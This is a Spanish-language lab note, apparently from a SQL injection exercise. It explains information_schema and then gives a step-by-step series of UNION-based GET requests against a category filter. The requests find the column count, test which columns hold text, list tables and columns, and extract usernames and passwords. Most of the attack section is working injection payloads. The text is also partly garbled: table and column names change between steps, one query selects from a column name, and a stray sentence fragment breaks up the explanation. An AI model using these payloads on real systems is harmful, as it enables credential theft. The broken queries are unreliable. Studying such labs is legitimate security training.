La mayoría de los tipos de bases de datos (excepto Oracle) tienen un conjunto de vistas llamado esquema de información. Esto proporciona información sobre la base de datos.

Por ejemplo, puedes consultar `information_schema.tables` Para listar las tablas en la base de datos:

`SELECT * FROM information_schema.tables`

Esto devuelve un resultado como el siguiente:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE`

Este resultado indica que hay tres tablas, llamadas `Products`, `Users`, y `Feedback`.

Luego puedes consultar `information_schema.columns` para enumerar las columnas en tablas individuales:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Esto devuelve un resultado como el siguiente:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar`

Son nombres de tablas que siempre existen en el  information_schema.tables`
`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE 
Esta salida muestra las columnas de la tabla especificada y el tipo de datos de cada columna.


Revisas que es vulnerable a SQLInjection
```
GET /filter?category='-- HTTP/2
```

Buscaremos la cantidad de columnas que devuelve prbando nulls de uno en una hasta obtener un resultado positivo en este caso nos da que tiene 2 columnas
```
GET /filter?category=Gifts'+UNION+select+NULL,+NULL-- HTTP/2
```

Veremos cuantas de estas son de texto probando igual de uno en una dandole parametros de tipo string 

```
Test1
GET /filter?category=Gifts'+UNION+select+'sdf',+NULL-- HTTP/2

Test2
GET /filter?category=Gifts'+UNION+select+'sdf','qwe'-- HTTP/2

```

Ambas columnas son vulnerables asi que probaremos extraer informacion del eschema
Esro nos devuelve todas las tablas de la BD
```
GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/2
```

Detectamos una tabla interesante y veremos sus columnas
```
GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+where+table_name='users_hwindv'-- HTTP/2
```


Teniendo sus Columnas obtendremos los valores de la tabla que detectamos con sus columnas

```
GET /filter?category='+UNION+SELECT+username_grycko,+password_wewmzo+from+users_ebywbj-- HTTP/2
```

Tambien podemos obtenerlo concatenando todo en una de las 2 columans que permiten string
Ejemplo1
```
GET /filter?category='+UNION+SELECT+NULL,username_grycko||'~'||password_wewmzo+from+username_grycko-- HTTP/2
```

Ejemplo2
```
GET /filter?category='+UNION+SELECT+username_cgqpup||'~'||password_gpszak,+NULL+from+users_hwindv-- HTTP/2
```


| username_cgqpup |
| --------------- |
| email           |
| password_gpszak |
